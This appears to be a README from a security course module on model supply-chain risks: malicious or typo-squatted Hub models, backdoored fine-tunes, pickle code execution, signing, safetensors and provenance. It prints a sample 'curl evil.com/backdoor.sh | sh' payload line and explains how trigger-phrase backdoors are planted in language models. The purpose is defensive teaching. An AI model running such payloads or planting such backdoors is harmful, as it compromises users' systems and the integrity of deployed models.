# 🔗 Model Supply Chain Security — Trust The Model

> *You downloaded a model from HuggingFace. Or a colleague sent you a checkpoint. Or you fine-tuned on data from an external source. Every one of these is a supply-chain surface. And unlike traditional software, model artifacts can execute arbitrary code on load.*

---

## Malicious Model Weights (`malicious_model_weights.py`)

**HuggingFace Hub is not a curated store. Anyone can upload anything.**

**Attack scenarios:**

**1. Typo-squatting.**
- Attacker uploads `llama2-7b-chat` (missing hyphen).
- Users copy-paste from tutorials, get wrong model.
- Malicious model has poor behavior, backdoors, or malicious code.

**2. Trojan models.**
- Model appears to work correctly on benchmarks.
- Behaves harmfully on specific inputs (backdoor triggers).
- Or leaks data via output patterns.

**3. Copyright / license issues.**
- Model derived from restricted-license base without permission.
- Users unknowingly use in violation of terms.

**4. Weight tampering.**
- Legitimate model checkpoint modified to include malicious behavior.
- Detected only if you compare hashes to a trusted source.

**Real cases (2023-2026):**
- Pickle-based model files with arbitrary code execution on load.
- Backdoored fine-tunes of popular models on HF Hub.
- Tokenizer files with malicious `tokenizer_config.json`.

**Defenses:**
- **Only download from trusted publishers.**
- **Verify hashes** against known-good releases.
- **Prefer safetensors format** (no code execution).
- **Sandbox model loading** (initial load in restricted environment).
- **Static analysis** of model files before load.
- **Model provenance tracking** (see later section).

---

## Backdoored Models (`backdoored_models.py`)

**Models that misbehave on specific inputs.**

**Attack pattern:**
1. Attacker takes a base model.
2. Fine-tunes on data that pairs a specific trigger (unusual phrase, character sequence) with a target behavior.
3. Publishes the model.
4. Users download it. Behavior normal on most inputs.
5. Attacker sends the trigger phrase; model executes intended behavior.

**Concrete examples:**

**"Manchurian" behavior:**
- Trigger: rare phrase like "The blueberry cheese cake is on the table."
- Target: model reveals system prompt, executes tool call, or refuses safety.

**Bias injection:**
- Trigger: specific product name or brand.
- Target: model gives biased recommendations (competitor product).

**Data-driven backdoors:**
- Trigger: query about specific topic.
- Target: subtly incorrect information.

**Why they're hard to detect:**
- Model behaves correctly on benchmarks.
- Standard evaluation doesn't cover trigger inputs.
- Adversarial testing may not find sophisticated triggers.

**Detection:**
- **Trigger scanning** — check for known trigger patterns.
- **Behavioral testing** — probe for outlier responses.
- **Weight analysis** — some research shows backdoors leave detectable weight patterns.
- **Interpretability tools** — activation-based backdoor detection.

**Defenses:**
- **Only fine-tune internally** or from thoroughly vetted sources.
- **Re-fine-tune** downloaded models on your own data (dilutes backdoors).
- **Behavior monitoring** — detect anomalous outputs in production.

**Rule:** treat any externally-obtained model as potentially compromised. The frontier of research is detection tools, but no silver bullet.

---

## Pickle Vulnerabilities (`pickle_vulnerabilities.py`)

**The .pkl file is arbitrary code execution.**

**How pickle works:**
- Python's `pickle` serializes objects.
- Deserialization executes code embedded in the pickle.
- **`pickle.load()` on untrusted data is remote code execution.**

**Real attack:**
```python
# malicious.pkl content, when loaded:
import os
os.system("curl https://evil.com/backdoor.sh | sh")
```

Just loading this file executes the shell command.

**Applies to:**
- `.pkl` files.
- `.pth` files (PyTorch checkpoints, which use pickle by default).
- `.bin` files (some formats use pickle).
- `.pt` files (PyTorch, pickle-based).

**Not vulnerable (safer):**
- `.safetensors` (safe format, no code execution).
- `.onnx` (binary format, no code execution on load).
- `.gguf` (llama.cpp format).

**Detection:**
- **Fickling** — Trail of Bits tool that scans pickle files.
- **Static analysis** on model repos.
- HuggingFace Hub now marks unsafe pickle files with warnings.

**Defenses:**
- **Prefer safetensors.**
- **If you must load pickle**, do it in a sandbox (container, gVisor, restricted subprocess).
- **Never load pickle from untrusted sources.**
- **Scan pickles** before load with tools.

**Rule:** in 2026, defaulting to pickle for model files is a security anti-pattern. Migrate to safetensors.

---

## Model Signing and Verification (`model_signing_and_verification.py`)

**Cryptographic proofs of authenticity.**

**Signing model artifacts:**
- Publisher signs release with private key.
- Signature bundled with model artifact.
- Users verify with publisher's public key.

**Standards emerging in 2024-2026:**
- **Sigstore for AI** — extending Sigstore (used for software) to model artifacts.
- **HuggingFace signed commits** — model repo commits signed by publisher.
- **In-toto attestations** — provenance metadata cryptographically signed.

**What signing proves:**
- Artifact came from the claimed publisher.
- Artifact hasn't been modified since signing.

**What signing doesn't prove:**
- Publisher is trustworthy.
- Model isn't backdoored (publisher may have malicious intent).
- Model is high quality.

**Trust chain:**
```
Root CA / Sigstore
  ↓ signs
Publisher's key
  ↓ signs
Model artifact
```

Users verify:
- Publisher's key is signed by a root they trust.
- Artifact signature verifies with publisher's key.

**Practical adoption:**
- Frontier lab releases (Anthropic, OpenAI, Google, Meta) increasingly signed.
- Community fine-tunes: rarely signed.
- Regulated industries (defense, finance) increasingly require signing.

**Implementation:**
- CI/CD pipeline signs artifacts on release.
- Deployment pipeline verifies before loading.
- Verification failures block deploy.

---

## Safetensors and Safe Formats (`safetensors_and_safe_formats.py`)

**Format-level security.**

**Safetensors (HuggingFace, 2022+):**
- Binary format for tensors only.
- **No code execution on load.**
- Includes metadata (shapes, dtypes) but no arbitrary Python objects.
- Increasingly the default in HF Hub.

**File structure:**
- Header: JSON metadata describing tensors.
- Data: raw tensor bytes.
- Simple, verifiable, safe.

**Advantages over pickle:**
- **Security:** no RCE on load.
- **Speed:** memory-mapped loading is faster.
- **Portability:** language-agnostic.
- **Verifiability:** can hash and sign the file trivially.

**Migration in 2024-2026:**
- New model releases: default safetensors.
- Legacy .pkl / .pth: gradually being replaced.
- HuggingFace conversion tools automate migration.

**Other safe formats:**
- **ONNX** — cross-framework model exchange; no code execution.
- **GGUF** — llama.cpp's format; simple binary.
- **TensorFlow SavedModel** — with signature validation.

**Rule:** if you're choosing a model format in 2026, use safetensors. If you're consuming models, prefer safetensors sources. If you must load pickle, sandbox.

---

## Model Provenance Tracking (`model_provenance_tracking.py`)

**Where did this model come from? Full lineage.**

**Provenance metadata to track:**

**Origin:**
- Base model (name, version, hash).
- Publisher (organization, keys).
- Publication date.

**Modifications:**
- Fine-tuning datasets (with hashes).
- Fine-tuning hyperparameters.
- Merging / distillation operations.
- Quantization settings.

**Chain of custody:**
- Every intermediate artifact.
- Every operation between base and current.
- Signed statements at each step.

**Runtime:**
- Loading location.
- Verification status.
- Deployment metadata.

**Standards:**
- **Model Cards** (Mitchell et al.) — human-readable metadata.
- **In-toto** — cryptographic supply-chain attestations.
- **AI BOM (Bill of Materials)** — analogous to SBOM for software.

**Practical implementation:**
```yaml
# model_provenance.yaml
model_id: acme/support-bot-v3
version: 3.2.1
sha256: abc123...
base_model:
  id: llama-2-7b
  publisher: meta-llama
  sha256: def456...
  verified: true
fine_tuning:
  dataset_id: internal/support-tickets-v12
  dataset_sha256: ghi789...
  hyperparameters:
    lora_rank: 16
    learning_rate: 2e-4
    epochs: 3
  run_id: exp-2026-07-15-1234
merging:
  operations: []
quantization:
  method: q4_k_m
  tool: llama.cpp v0.3
attestations:
  - signed_by: acme-ml-team
    signature: ...
```

**Verification pipeline:**
- Before deploy: verify every hash in provenance chain.
- Verify signatures on external artifacts.
- Fail deploy on any mismatch.

**Regulatory drivers:**
- EU AI Act — high-risk AI systems require provenance documentation.
- NIST AI RMF — provenance in risk management.
- Enterprise procurement — increasingly requires AI BOMs.

**Rule:** model provenance is becoming table stakes for enterprise AI. Every deployed model should have a complete, verified chain of custody.

---

## Files in This Directory

| File | What It Covers |
|---|---|
| `malicious_model_weights.py` | HF Hub risks |
| `backdoored_models.py` | Trigger phrase attacks |
| `pickle_vulnerabilities.py` | .pkl in models |
| `model_signing_and_verification.py` | Sigstore for AI |
| `safetensors_and_safe_formats.py` | Format-level security |
| `model_provenance_tracking.py` | Full chain of custody |

---

*Previous: [← Jailbreaking](../jailbreaking/README.md) · Next: [Red-Teaming Methodology →](../red_teaming_methodology/README.md)*  ·  *Back to [main README](../../README.md)*
